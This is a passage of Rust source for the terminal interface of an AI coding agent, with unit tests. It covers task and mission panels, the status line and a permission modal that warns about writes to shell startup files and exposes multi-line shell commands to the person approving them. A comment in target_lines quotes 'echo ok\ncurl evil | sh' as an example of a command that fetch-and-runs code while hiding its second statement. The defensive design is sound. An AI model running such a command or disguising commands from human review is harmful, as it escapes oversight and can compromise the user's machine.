        if tasks_height > 0 {
            let done = self
                .tasks
                .iter()
                .filter(|t| t.status == TaskStatus::Done)
                .count();
            let task_lines: Vec<Line> = task_window(&self.tasks, MAX_VISIBLE_TASKS)
                .iter()
                .map(task_line)
                .collect();
            let panel = Paragraph::new(task_lines).block(
                Block::default()
                    .borders(Borders::ALL)
                    .title(format!("Tasks ({done}/{})", self.tasks.len())),
            );
            frame.render_widget(panel, layout[panel_index]);
            panel_index += 1;
        }

        if mission_height > 0 {
            let mut lines: Vec<Line> = Vec::new();
            if let Some(plan) = &self.mission_plan {
                lines.extend(
                    mission_step_window(&plan.steps, MAX_VISIBLE_MISSION_STEPS)
                        .iter()
                        .map(mission_step_line),
                );
            }
            if !self.open_specialist_sessions.is_empty() {
                let members: Vec<&str> = self
                    .open_specialist_sessions
                    .iter()
                    .map(|s| s.member.as_str())
                    .collect();
                lines.push(Line::from(format!("Open: {}", members.join(", "))));
            }
            let title = match &self.mission_plan {
                Some(plan) => {
                    let verified = plan
                        .steps
                        .iter()
                        .filter(|s| s.status == StepStatus::Verified)
                        .count();
                    format!("Mission ({verified}/{} steps)", plan.steps.len())
                }
                None => "Mission".to_string(),
            };
            let panel =
                Paragraph::new(lines).block(Block::default().borders(Borders::ALL).title(title));
            frame.render_widget(panel, layout[panel_index]);
        }

        frame.render_widget(&self.input, input_area);

        let hints = self.command_hint_matches();
        if !hints.is_empty() {
            let hint_area = command_hint_rect(input_area, hints.len() as u16);
            render_command_hint(frame, hint_area, &hints);
        }

        let base = if self.streaming_active {
            "streaming... (Ctrl+C to cancel)"
        } else {
            "ready — Enter to send, Ctrl+C to quit"
        };
        let mut status_spans = Vec::new();
        if self.plan_mode.active() {
            status_spans.push(Span::styled(
                "PLAN (Ctrl+P to act)   ·   ",
                Style::default()
                    .fg(Color::Magenta)
                    .add_modifier(Modifier::BOLD),
            ));
        }
        status_spans.push(Span::styled(base, Style::default().fg(Color::DarkGray)));
        if let Some((used, limit)) = self.context_usage {
            let pct = (used as f64 / limit.max(1) as f64 * 100.0).round() as u32;
            // Green under 60%, amber approaching the ceiling, red once
            // compaction is imminent — so the user sees the window filling
            // instead of the model silently degrading on overflow.
            let color = if pct >= 85 {
                Color::Red
            } else if pct >= 60 {
                Color::Yellow
            } else {
                Color::Green
            };
            status_spans.push(Span::styled(
                format!(
                    "   ·   ctx {}/{} ({pct}%)",
                    format_tokens(used),
                    format_tokens(limit)
                ),
                Style::default().fg(color),
            ));
        }
        if let Some(model) = &self.routed_model {
            status_spans.push(Span::styled(
                format!("   ·   model {model}"),
                Style::default().fg(Color::Cyan),
            ));
        }
        frame.render_widget(Paragraph::new(Line::from(status_spans)), status_area);

        // Belt-and-braces alongside the stale-modal `select!` branch in
        // `run`: that branch only clears `pending_permission` on its own
        // wakeup, so a redraw that lands in the same tick the editor
        // answered (before the branch has run) must not repaint a modal
        // whose decision is already resolved.
        if !self.pending_permission_is_stale()
            && let Some(modal) = &self.pending_permission
        {
            render_permission_modal(frame, &modal.request);
        }
    }
}

/// Rebuilds transcript lines from a restored session's message history, so
/// a resumed conversation is visible instead of starting on a blank screen
/// with invisible context. Mirrors what `handle_agent_event` would have
/// produced live; the system prompt is never part of stored history.
fn seed_transcript(history: &[Message]) -> Vec<ChatLine> {
    let mut lines = Vec::new();
    for message in history {
        match message.role {
            Role::System => {}
            Role::User => lines.push(ChatLine::User(message.text_content())),
            Role::Assistant => {
                for block in &message.content {
                    match block {
                        ContentBlock::Text(text) if !text.is_empty() => {
                            lines.push(ChatLine::Assistant(text.clone()));
                        }
                        ContentBlock::ToolCall(call) => {
                            let prefix = if call.source == ToolCallSource::AutoVerification {
                                "auto-verify: "
                            } else {
                                ""
                            };
                            lines.push(ChatLine::ToolCall(format!(
                                "{prefix}{}",
                                tool_call_summary(&call.name, &call.arguments)
                            )));
                        }
                        _ => {}
                    }
                }
            }
            Role::Tool => {
                for block in &message.content {
                    if let ContentBlock::ToolResult(result) = block {
                        lines.push(ChatLine::ToolResult(tool_output_text(&result.output)));
                    }
                }
            }
        }
    }
    lines
}

fn tool_output_text(output: &ToolOutput) -> String {
    match output {
        ToolOutput::Ok(s) => s.clone(),
        ToolOutput::Error(s) => format!("error: {s}"),
        ToolOutput::Denied(s) => format!("denied: {s}"),
    }
}

/// Renders one nested `AgentEvent` from a `delegate_task` sub-agent as a
/// single line of text for `ChatLine::SubAgent` — deliberately reuses the
/// same shape the parent's own top-level events render as (tool
/// name/args, tool output text, plain text deltas) so a sub-agent's
/// activity reads the same way the parent's own would, just prefixed
/// distinctly by `chat_line_to_lines`.
fn sub_agent_event_text(event: &AgentEvent) -> String {
    match event {
        AgentEvent::TextDelta(text) | AgentEvent::ReasoningDelta(text) => text.clone(),
        AgentEvent::ToolCallDetected(call) => format!("{}({})", call.name, call.arguments),
        AgentEvent::ToolResult(result) => tool_output_text(&result.output),
        AgentEvent::Error(text) | AgentEvent::TurnPaused(text) => text.clone(),
        AgentEvent::TurnComplete
        | AgentEvent::ContextUsage { .. }
        | AgentEvent::TasksUpdated(_)
        | AgentEvent::CouncilNote(_)
        | AgentEvent::ArchitectNote(_)
        | AgentEvent::SubAgentActivity(_)
        | AgentEvent::ModelRouted { .. }
        | AgentEvent::ConversationCleared
        | AgentEvent::MissionsUpdated(_)
        | AgentEvent::SpecialistSessionsUpdated(_) => String::new(),
    }
}

/// The slice of tasks the panel shows when the list is longer than `max`:
/// a window starting at the first unfinished task (clamped so the window is
/// always full). A long list's leading run of done items is the least
/// interesting part — without this, a 10-task list with 6 done would show
/// only finished work. Each row displays the task's real id, so a window
/// starting mid-list is self-explanatory.
fn task_window(tasks: &[Task], max: usize) -> &[Task] {
    if tasks.len() <= max {
        return tasks;
    }
    let first_unfinished = tasks
        .iter()
        .position(|t| t.status != TaskStatus::Done)
        .unwrap_or(0);
    let start = first_unfinished.min(tasks.len() - max);
    &tasks[start..start + max]
}

fn task_line(task: &Task) -> Line<'static> {
    let (marker, style) = match task.status {
        TaskStatus::Pending => ("[ ]", Style::default()),
        TaskStatus::InProgress => ("[~]", Style::default().fg(Color::Yellow)),
        TaskStatus::Done => ("[x]", Style::default().fg(Color::DarkGray)),
    };
    Line::from(format!("{marker} {}. {}", task.id, task.text)).style(style)
}

/// Height (in rows, including borders) of the Mission panel, or 0 to hide
/// it entirely. The panel must be visible whenever there's a mission plan
/// at all — even one with zero steps, an edge case `decompose_task` can hit
/// — or whenever there are open specialist sessions, independent of step
/// count. Checking `mission_plan.is_some()` rather than `steps.len() != 0`
/// is what makes that true; see the regression tests below for the bug
/// this guards against.
fn mission_panel_height(
    mission_plan: Option<&MissionPlan>,
    open_specialist_sessions: &[SpecialistSessionSummary],
) -> u16 {
    if mission_plan.is_none() && open_specialist_sessions.is_empty() {
        return 0;
    }
    let step_count = mission_plan.map(|p| p.steps.len()).unwrap_or(0);
    let step_rows = step_count.min(MAX_VISIBLE_MISSION_STEPS) as u16;
    let sessions_row: u16 = if open_specialist_sessions.is_empty() {
        0
    } else {
        1
    };
    step_rows + sessions_row + 2 // + borders
}

fn mission_step_window(steps: &[MissionStep], max: usize) -> &[MissionStep] {
    if steps.len() <= max {
        return steps;
    }
    // Anchor on the first step that still needs attention -- `Pending` OR
    // `Failed`, not just `Pending`. Anchoring on `Pending` alone used to
    // hide a trailing `Failed` step entirely whenever every other step was
    // already `Verified` (no `Pending` steps left at all): `position` would
    // find nothing, fall back to `unwrap_or(0)`, and show the window from
    // the start -- burying the one actionable, red-highlighted `[!]` step
    // `mission_step_line` exists to surface. See the regression test below.
    let first_unverified = steps
        .iter()
        .position(|s| s.status != StepStatus::Verified)
        .unwrap_or(0);
    let start = first_unverified.min(steps.len() - max);
    &steps[start..start + max]
}

fn mission_step_line(step: &MissionStep) -> Line<'static> {
    let (marker, style) = match step.status {
        StepStatus::Pending => ("[ ]", Style::default()),
        StepStatus::Verified => ("[x]", Style::default().fg(Color::DarkGray)),
        StepStatus::Failed => ("[!]", Style::default().fg(Color::Red)),
    };
    Line::from(format!(
        "{marker} {}. [{}] {}",
        step.id, step.member, step.task
    ))
    .style(style)
}

/// Compact token count for the status line: `6.1k`, `512`, `128.0k`.
fn format_tokens(n: u32) -> String {
    if n >= 1000 {
        format!("{:.1}k", n as f64 / 1000.0)
    } else {
        n.to_string()
    }
}

fn new_input_box() -> TextArea<'static> {
    let mut input = TextArea::default();
    input.set_placeholder_text("Type a message and press Enter to send...");
    input.set_block(Block::default().borders(Borders::ALL).title("Message"));
    input
}

/// Builds the `/help` block (U4/U5): every known slash command (sourced
/// from `aivyx_core::commands::COMMANDS` -- the same table `/clear`'s and
/// the autocomplete hint's own logic reads, so this listing can never
/// drift from what actually exists), then a "Keys" section listing only
/// the bindings that actually exist in the key-handling loop above
/// (`Enter`, `Ctrl+C`, `Ctrl+P`, `y`/`a`/`n` during an approval prompt --
/// there is no scrolling binding today, so none is claimed here), then
/// one line pointing at the real undo mechanism (git-ref checkpoints) --
/// included unconditionally since there is no in-app undo command yet;
/// remove this line if one is ever added.
fn help_text() -> String {
    let mut lines = vec!["Available commands:".to_string()];
    for cmd in aivyx_core::commands::COMMANDS {
        lines.push(format!("  {} — {}", cmd.name, cmd.description));
    }
    lines.push(String::new());
    lines.push("Keys:".to_string());
    lines.push("  Enter       send".to_string());
    lines.push("  Ctrl+C      cancel a reply / quit when idle".to_string());
    lines.push("  Ctrl+P      plan mode on/off".to_string());
    lines.push("  y / a / n   in an approval prompt: allow / always-allow / deny".to_string());
    lines.join("\n")
}

/// Shown until the first message: what to type, and what happens next.
fn first_message_hint() -> Vec<Line<'static>> {
    let dim = Style::default().fg(Color::DarkGray);
    [
        "",
        "Ask for a change or a question about this project, for example:",
        "  \"the tests in calc.py fail — find out why and fix it\"",
        "  \"explain how the config file is loaded\"",
        "Every file edit and command waits for your approval ([y] to allow).",
        "/help lists commands · Ctrl+C quits",
    ]
    .into_iter()
    .map(|t| Line::from(t).style(dim))
    .collect()
}

/// A path as the person reads it: relative to the project directory when
/// it's inside it, as given otherwise.
fn display_path(path: &std::path::Path) -> String {
    std::env::current_dir()
        .ok()
        .and_then(|cwd| path.strip_prefix(cwd).ok().map(|p| p.display().to_string()))
        .filter(|p| !p.is_empty())
        .unwrap_or_else(|| path.display().to_string())
}

/// One readable line for a tool call in the transcript: its name and the
/// argument that says what it touches (`edit_file(calc.py)`,
/// `run_shell(cargo test)`), not the raw JSON with escaped newlines. The
/// permission modal still shows the full change before anything runs.
fn tool_call_summary(name: &str, args: &serde_json::Value) -> String {
    let field = |k: &str| args.get(k).and_then(|v| v.as_str());
    let what = field("path")
        .map(|p| display_path(std::path::Path::new(p)))
        .or_else(|| field("command").map(str::to_string))
        .or_else(|| field("pattern").map(str::to_string))
        .or_else(|| field("query").map(str::to_string));
    match what {
        Some(w) => format!("{name}({w})"),
        None => {
            let raw = args.to_string();
            let raw = if raw == "{}" { String::new() } else { raw };
            let cut: String = raw.chars().take(160).collect();
            let ellipsis = if cut.len() < raw.len() { "…" } else { "" };
            format!("{name}({cut}{ellipsis})")
        }
    }
}

/// Whether the modal should offer "Always Allow" for this request — `false`
/// for a Write/Delete/Move target `aivyx_sandbox::runs_code_later_for_request`
/// flags (a shell startup file, an XDG autostart entry, a systemd user
/// unit), so one approval can't silently bless every future edit to a file
/// that runs code outside Landlock's confinement scope. See audit finding
/// M1 (2026-10-02).
fn offer_always_allow(request: &PermissionRequest) -> bool {
    aivyx_sandbox::runs_code_later_for_request(request).is_none()
}

/// The warning line shown above the diff/preview for a target
/// `runs_code_later_for_request` flags, or `None` for anything else.
fn runs_code_later_warning(request: &PermissionRequest) -> Option<Line<'static>> {
    let reason = aivyx_sandbox::runs_code_later_for_request(request)?;
    Some(
        Line::from(format!(
            "⚠ This file {reason} — approving lets it run code outside the sandbox."
        ))
        .style(Style::default().fg(Color::Yellow)),
    )
}

fn render_permission_modal(frame: &mut ratatui::Frame, request: &PermissionRequest) {
    let area = centered_rect(70, 60, frame.area());
    frame.render_widget(Clear, area);

    let block = Block::default()
        .borders(Borders::ALL)
        .title("Permission required")
        .style(Style::default().fg(Color::Yellow));
    let inner = block.inner(area);
    frame.render_widget(block, area);

    let mut lines: Vec<Line> = vec![
        Line::from(format!("Tool: {}", request.tool_name))
            .style(Style::default().add_modifier(Modifier::BOLD)),
        Line::from(format!("Action: {:?}", request.action)),
    ];
    lines.extend(target_lines(&request.target));
    if let Some(warning) = runs_code_later_warning(request) {
        lines.push(warning);
    }
    lines.push(Line::from(""));

    match request.preview.as_deref() {
        Some(preview) if !preview.is_empty() => lines.extend(preview.lines().map(|l| {
            // The diff's file headers name the file relative to the project.
            match l.strip_prefix("--- ").or_else(|| l.strip_prefix("+++ ")) {
                Some(path) => diff_line(&format!(
                    "{} {}",
                    &l[..3],
                    display_path(std::path::Path::new(path))
                )),
                None => diff_line(l),
            }
        })),
        // U2: an empty object (e.g. `run_shell`, whose whole command
        // already appears on the "Command: " line above) is pure noise --
        // omit the line entirely rather than showing "Args: {}".
        _ if request.arguments_preview != serde_json::json!({}) => {
            lines.push(Line::from(format!("Args: {}", request.arguments_preview)));
        }
        _ => {}
    }

    // The action-key legend renders in its own fixed-height footer row,
    // never inside the same scroll-clipped Paragraph as the diff/content
    // above — a diff taller than `inner`'s height used to push this line
    // off-screen entirely (it was just the last entry in one long `Vec<Line>`),
    // leaving a human with no visible way to know how to respond to a large
    // new-file write. Splitting the two guarantees the legend always shows,
    // regardless of how long the content above it is.
    let footer_height = 2u16.min(inner.height);
    let content_height = inner.height.saturating_sub(footer_height);
    let rows = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(content_height),
            Constraint::Length(footer_height),
        ])
        .split(inner);

    let content = Paragraph::new(lines).wrap(Wrap { trim: false });
    frame.render_widget(content, rows[0]);

    let footer_text = if offer_always_allow(request) {
        "[y] Allow    [a] Always Allow    [n] / [Esc] / [Enter] Deny"
    } else {
        "[y] Allow    [n] / [Esc] / [Enter] Deny"
    };
    let footer = Paragraph::new(Line::from(footer_text)).style(Style::default().fg(Color::DarkGray));
    frame.render_widget(footer, rows[1]);
}

fn target_lines(target: &PermissionTarget) -> Vec<Line<'static>> {
    // Split on embedded newlines into separate `Line`s. Ratatui's `Span`
    // rendering silently drops `\n`, so a `run_shell` command like
    // "echo ok\ncurl evil | sh" would otherwise render as a single
    // innocuous-looking line, hiding the second statement from the person
    // deciding whether to approve it. The target string is prefixed by a
    // label ("Command: ", "Target: ") whose width the continuation lines
    // are indented to, matching the transcript's `prefixed_lines`.
    let (label, body) = match target {
        PermissionTarget::Path(path) => ("Target: ", display_path(path)),
        PermissionTarget::Command { program, args } => {
            // U2: quote any word that needs it (e.g. a `run_shell` script
            // body, which is itself one `sh -c` argument but often
            // contains spaces) as a single shell word, so the line reads
            // as the real invocation rather than looking like several
            // separate arguments to `sh`.
            let words: Vec<String> = std::iter::once(program.as_str())
                .chain(args.iter().map(String::as_str))
                .map(shell_quote_word)
                .collect();
            ("Command: ", words.join(" "))
        }
        PermissionTarget::Other(description) => ("Target: ", description.clone()),
        PermissionTarget::Move { from, to } => {
            ("Move: ", format!("{} -> {}", from.display(), to.display()))
        }
    };

    if body.is_empty() {
        return vec![Line::from(label)];
    }
    let indent = " ".repeat(label.len());
    body.lines()
        .enumerate()
        .map(|(i, line)| {
            let prefix = if i == 0 { label } else { indent.as_str() };
            Line::from(format!("{prefix}{line}"))
        })
        .collect()
}

/// Quotes `word` as a single POSIX shell word if it needs it (U2) --
/// otherwise returned as-is, so a simple program name or flag like `sh` or
/// `-c` isn't cluttered with needless quotes. "Needs it" means empty, or
/// containing whitespace or any shell-meta character; single-quoted with
/// the standard `'` → `'\''` escape (safe inside single quotes, where
/// nothing else is special).
fn shell_quote_word(word: &str) -> String {
    let needs_quoting = word.is_empty()
        || word
            .chars()
            .any(|c| c.is_whitespace() || "'\"$`\\&|;()<>!*?[]{}~#".contains(c));
    if !needs_quoting {
        return word.to_string();
    }
    format!("'{}'", word.replace('\'', "'\\''"))
}

fn diff_line(line: &str) -> Line<'static> {
    let style = if line.starts_with('+') {
        Style::default().fg(Color::Green)
    } else if line.starts_with('-') {
        Style::default().fg(Color::Red)
    } else if line.starts_with("@@") {
        Style::default().fg(Color::Cyan)
    } else {
        Style::default()
    };
    Line::from(line.to_string()).style(style)
}

/// Standard ratatui centered-popup pattern: split vertically then
/// horizontally around the target percentage, keep the middle piece.
fn centered_rect(percent_x: u16, percent_y: u16, area: Rect) -> Rect {
    let vertical = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Percentage((100 - percent_y) / 2),
            Constraint::Percentage(percent_y),
            Constraint::Percentage((100 - percent_y) / 2),
        ])
        .split(area);

    Layout::default()
        .direction(Direction::Horizontal)
        .constraints([
            Constraint::Percentage((100 - percent_x) / 2),
            Constraint::Percentage(percent_x),
            Constraint::Percentage((100 - percent_x) / 2),
        ])
        .split(vertical[1])[1]
}

/// The area for the command-hint popup: anchored directly above
/// `input_area`, same width, one row per match plus borders — clamped so
/// it never extends above the top of the frame (`saturating_sub` avoids
/// an underflow panic when `input_area.y` is small).
fn command_hint_rect(input_area: Rect, match_count: u16) -> Rect {
    let height = match_count + 2;
    let y = input_area.y.saturating_sub(height);
    Rect {
        x: input_area.x,
        y,
        width: input_area.width,
        height,
    }
}

fn render_command_hint(
    frame: &mut ratatui::Frame,
    area: Rect,
    matches: &[&aivyx_core::commands::CommandInfo],
) {
    frame.render_widget(Clear, area);
    let lines: Vec<Line> = matches
        .iter()
        .map(|c| Line::from(format!("{} — {}", c.name, c.description)))
        .collect();
    let block = Block::default().borders(Borders::ALL).title("Commands");
    frame.render_widget(Paragraph::new(lines).block(block), area);
}

fn chat_line_to_lines(line: &ChatLine) -> Vec<Line<'static>> {
    // Every variant goes through `prefixed_lines` (not a single
    // `Line::from(format!(...))`) so multi-line text — e.g. any read_file
    // result longer than one line — actually breaks into separate `Line`s.
    // Ratatui's `Span` rendering silently drops embedded `\n` characters,
    // so skipping this for tool output rendered as one concatenated wall
    // of text instead of the file's real line breaks.
    match line {
        ChatLine::User(text) => prefixed_lines(text, "you  > ", Style::default().fg(Color::Cyan)),
        ChatLine::Assistant(text) => prefixed_lines(text, "aivyx> ", Style::default()),
        ChatLine::ToolCall(text) => {
            prefixed_lines(text, "  tool call: ", Style::default().fg(Color::Yellow))
        }
        ChatLine::ToolResult(text) => {
            prefixed_lines(text, "  tool result: ", Style::default().fg(Color::Green))
        }
        ChatLine::Notice(text) => prefixed_lines(
            text,
            "  ! ",
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        ),
        // Plain block, no prefix — see the variant's own doc comment.
        ChatLine::Help(text) => prefixed_lines(text, "", Style::default()),
        ChatLine::Cancelled(text) => {
            prefixed_lines(text, "  ", Style::default().fg(Color::DarkGray))
        }
        // Deliberately not red/bold like Notice — a paused turn hasn't
        // failed, and shouldn't read like it has.
        ChatLine::Paused(text) => {
            prefixed_lines(text, "  ~ paused: ", Style::default().fg(Color::Blue))
        }
        ChatLine::Council(text) => {
            prefixed_lines(text, "council> ", Style::default().fg(Color::Magenta))
        }
        ChatLine::Architect(text) => {
            prefixed_lines(text, "architect> ", Style::default().fg(Color::Cyan))
        }
        ChatLine::SubAgent(text) => {
            if text.is_empty() {
                return Vec::new();
            }
            prefixed_lines(
                text,
                "  sub-agent> ",
                Style::default().fg(Color::LightYellow),
            )
        }
        ChatLine::Reasoning(text) => prefixed_lines(
            text,
            "  thinking: ",
            Style::default()
                .fg(Color::DarkGray)
                .add_modifier(Modifier::ITALIC),
        ),
    }
}

fn prefixed_lines(text: &str, prefix: &'static str, style: Style) -> Vec<Line<'static>> {
    if text.is_empty() {
        // `str::lines()` yields nothing for an empty string, which would
        // otherwise make the whole entry vanish from the transcript
        // instead of e.g. showing "tool result: " for a 0-byte file read.
        return vec![Line::from(prefix).style(style)];
    }

    let indent = " ".repeat(prefix.len());
    text.lines()
        .enumerate()
        .map(|(i, line)| {
            let prefix = if i == 0 { prefix } else { indent.as_str() };
            Line::from(format!("{prefix}{line}")).style(style)
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tool_calls_read_as_what_they_touch() {
        let cwd = std::env::current_dir().unwrap();
        let inside = cwd.join("src/calc.py");
        let args = serde_json::json!({"path": inside, "old_string": "a\nb", "new_string": "c"});
        assert_eq!(tool_call_summary("edit_file", &args), "edit_file(src/calc.py)");
        let args = serde_json::json!({"command": "cargo test -q"});
        assert_eq!(tool_call_summary("run_shell", &args), "run_shell(cargo test -q)");
        assert_eq!(tool_call_summary("list_tasks", &serde_json::json!({})), "list_tasks()");
        let long = serde_json::json!({"items": "x".repeat(400)});
        let s = tool_call_summary("other", &long);
        assert!(s.ends_with("…)") && s.chars().count() < 180, "{s}");
    }

    #[test]
    fn paths_outside_the_project_stay_absolute() {
        assert_eq!(display_path(std::path::Path::new("/etc/hosts")), "/etc/hosts");
    }
    use aivyx_sandbox::ActionKind;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;
    use tokio::sync::oneshot;

    /// Row-major text dump of a rendered `Buffer`, with a `\n` inserted at
    /// every row boundary — `Buffer::content()` alone is a flat cell slice,
    /// so joining cells naively across rows without a row-boundary marker
    /// risks two real words merging into one and silently passing a
    /// substring assertion that should have failed.
    fn render_to_string(terminal: &Terminal<TestBackend>) -> String {
        let buffer = terminal.backend().buffer();
        let width = buffer.area.width as usize;
        let mut rendered = String::new();
        for (i, cell) in buffer.content().iter().enumerate() {
            if i > 0 && i % width == 0 {
                rendered.push('\n');
            }
            rendered.push_str(cell.symbol());
        }
        rendered
    }

    #[test]
    fn the_status_line_shows_the_routed_model() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::ModelRouted {
            model: "qwen3-coder:30b@gpu".into(),
            reason: "chose `qwen3-coder:30b`: matches the large tier wanted".into(),
        });
        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal.draw(|frame| app.render(frame)).unwrap();
        let rendered = render_to_string(&terminal);
        assert!(rendered.contains("model qwen3-coder:30b@gpu"), "{rendered}");
        assert!(
            rendered.contains("routing → qwen3-coder:30b@gpu"),
            "{rendered}"
        );

        app.handle_agent_event(AgentEvent::ConversationCleared);
        let mut terminal = Terminal::new(TestBackend::new(120, 40)).unwrap();
        terminal.draw(|frame| app.render(frame)).unwrap();
        assert!(!render_to_string(&terminal).contains("model qwen3-coder"));
    }

    #[test]
    fn startup_banner_contains_real_content_and_is_structurally_balanced() {
        let banner = startup_banner();

        // Real content present (plain substrings survive being wrapped in
        // ANSI color codes -- crossterm's Stylize wraps content, doesn't
        // transform it).
        assert!(banner.contains("aivyx-coder"));
        assert!(banner.contains(env!("CARGO_PKG_VERSION")));
        assert!(banner.contains("local models only"));
        assert!(banner.contains('\u{25cf}')); // the status dot

        // Box-drawing structure: exactly one top-left/top-right/bottom-left/
        // bottom-right corner each, and exactly 4 vertical-bar glyphs (2 per
        // content line).
        assert_eq!(banner.matches('\u{250c}').count(), 1); // ┌
        assert_eq!(banner.matches('\u{2510}').count(), 1); // ┐
        assert_eq!(banner.matches('\u{2514}').count(), 1); // └
        assert_eq!(banner.matches('\u{2518}').count(), 1); // ┘
        assert_eq!(banner.matches('\u{2502}').count(), 4); // │

        // Exactly 4 printed lines (top border, 2 content lines, bottom
        // border), each terminated by \n.
        assert_eq!(banner.matches('\n').count(), 4);
    }

    #[test]
    fn permission_modal_button_row_stays_visible_for_a_long_diff() {
        // Regression test: `render_permission_modal` used to append the
        // Allow/Deny button row to the *same* unscrolled `Paragraph` as the
        // diff preview, so a diff taller than the popup's available height
        // pushed the button row off-screen entirely — a human approving a
        // large new-file write would see the diff but have no visible way
        // to know how to respond. The footer must always render, regardless
        // of how long the diff above it is.
        let long_preview: String = (0..200).map(|i| format!("+line {i}\n")).collect();
        let request = PermissionRequest {
            tool_name: "write_file".to_string(),
            action: ActionKind::Write,
            target: PermissionTarget::Path(PathBuf::from("/tmp/big_file.rs")),
            arguments_preview: serde_json::json!({}),
            preview: Some(long_preview),
            diff: None,
        };

        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal
            .draw(|frame| render_permission_modal(frame, &request))
            .unwrap();

        let rendered = render_to_string(&terminal);
        assert!(
            rendered.contains("Allow"),
            "the Allow/Deny button row must always be visible, even for a long diff:\n{rendered}"
        );
    }

    // --- M1: warn + hide Always Allow for a file that runs code later ---

    fn shell_startup_write_request() -> PermissionRequest {
        let home = PathBuf::from(std::env::var_os("HOME").expect("HOME must be set"));
        PermissionRequest {
            tool_name: "write_file".to_string(),
            action: ActionKind::Write,
            target: PermissionTarget::Path(home.join(".bashrc")),
            arguments_preview: serde_json::json!({}),
            preview: Some("+echo hi\n".to_string()),
            diff: None,
        }
    }

    #[test]
    fn offer_always_allow_is_false_for_a_shell_startup_file_write() {
        assert!(!offer_always_allow(&shell_startup_write_request()));
    }

    #[test]
    fn offer_always_allow_is_true_for_an_ordinary_project_write() {
        let request = PermissionRequest {
            tool_name: "write_file".to_string(),
            action: ActionKind::Write,
            target: PermissionTarget::Path(PathBuf::from("/tmp/project/src/main.rs")),
            arguments_preview: serde_json::json!({}),
            preview: None,
            diff: None,
        };
        assert!(offer_always_allow(&request));
    }

    #[test]
    fn render_permission_modal_shows_a_warning_for_a_shell_startup_file() {
        let request = shell_startup_write_request();
        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal
            .draw(|frame| render_permission_modal(frame, &request))
            .unwrap();
        let rendered = render_to_string(&terminal);
        assert!(
            rendered.contains("runs every time you open a shell"),
            "{rendered}"
        );
        // Checked as two separate substrings, not one contiguous phrase --
        // the Paragraph's word-wrap can split "...outside / the sandbox."
        // across a row boundary at this terminal width, and
        // `render_to_string` inserts a `\n` at every row boundary.
        assert!(rendered.contains("approving lets it run code"), "{rendered}");
        assert!(rendered.contains("sandbox"), "{rendered}");
    }

    #[test]
    fn render_permission_modal_hides_always_allow_for_a_shell_startup_file() {
        let request = shell_startup_write_request();
        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal
            .draw(|frame| render_permission_modal(frame, &request))
            .unwrap();
        let rendered = render_to_string(&terminal);
        assert!(
            !rendered.contains("Always Allow"),
            "Always Allow must not be offered for a file that runs code later:\n{rendered}"
        );
    }

    #[test]
    fn render_permission_modal_still_offers_always_allow_for_an_ordinary_write() {
        let request = PermissionRequest {
            tool_name: "write_file".to_string(),
            action: ActionKind::Write,
            target: PermissionTarget::Path(PathBuf::from("/tmp/project/src/main.rs")),
            arguments_preview: serde_json::json!({}),
            preview: Some("+fn main() {}\n".to_string()),
            diff: None,
        };
        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal
            .draw(|frame| render_permission_modal(frame, &request))
            .unwrap();
        let rendered = render_to_string(&terminal);
        assert!(rendered.contains("Always Allow"), "{rendered}");
    }

    #[test]
    fn command_target_with_embedded_newline_splits_into_visible_lines() {
        // Regression test for the modal newline-hiding bug: a `run_shell`
        // command whose string contains a real `\n` must render as multiple
        // `Line`s so the second statement can't be hidden from the reviewer
        // by ratatui's silent `\n`-dropping in single-`Line` rendering.
        let target = PermissionTarget::Command {
            program: "sh".to_string(),
            args: vec!["-c".to_string(), "echo first\necho second".to_string()],
        };

        let lines = target_lines(&target);
        assert_eq!(
            lines.len(),
            2,
            "expected the newline to split into two lines"
        );
        // U2: the script contains whitespace, so it's quoted as one shell
        // word -- the leading quote lands on the first visible line.
        assert_eq!(lines[0].to_string(), "Command: sh -c 'echo first");
        // The second statement must be present as its own visible line.
        assert!(lines[1].to_string().contains("echo second"));
    }

    #[test]
    fn a_run_shell_script_with_spaces_is_quoted_as_one_shell_word() {
        // U2 regression: "sh -c python3 -m unittest test_stats.py" read as
        // if `sh` got several separate arguments; it must instead read as
        // the real invocation, the whole script quoted as sh's one `-c`
        // argument.
        let target = PermissionTarget::Command {
            program: "sh".to_string(),
            args: vec![
                "-c".to_string(),
                "python3 -m unittest test_stats.py".to_string(),
            ],
        };

        let lines = target_lines(&target);
        assert_eq!(lines.len(), 1);
        assert_eq!(
            lines[0].to_string(),
            "Command: sh -c 'python3 -m unittest test_stats.py'"
        );
    }

    #[test]
    fn shell_quote_word_leaves_simple_words_bare() {
        assert_eq!(shell_quote_word("sh"), "sh");
        assert_eq!(shell_quote_word("-c"), "-c");
        assert_eq!(shell_quote_word("cargo"), "cargo");
    }

    #[test]
    fn shell_quote_word_escapes_an_embedded_single_quote() {
        assert_eq!(shell_quote_word("it's broken"), "'it'\\''s broken'");
    }

    #[test]
    fn render_permission_modal_omits_the_args_line_for_an_empty_object_preview() {
        let request = PermissionRequest {
            tool_name: "run_shell".to_string(),
            action: ActionKind::Execute,
            target: PermissionTarget::Command {
                program: "sh".to_string(),
                args: vec!["-c".to_string(), "echo hi".to_string()],
            },
            arguments_preview: serde_json::json!({}),
            preview: None,
            diff: None,
        };

        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal
            .draw(|frame| render_permission_modal(frame, &request))
            .unwrap();
        let rendered = render_to_string(&terminal);
        assert!(!rendered.contains("Args:"), "unexpected Args line: {rendered}");
    }

    #[test]
    fn move_target_renders_as_from_arrow_to() {
        let target = PermissionTarget::Move {
            from: PathBuf::from("/project/old.rs"),
            to: PathBuf::from("/project/new.rs"),
        };

        let lines = target_lines(&target);
        assert_eq!(lines.len(), 1);
        assert_eq!(
            lines[0].to_string(),
            "Move: /project/old.rs -> /project/new.rs"
        );
    }

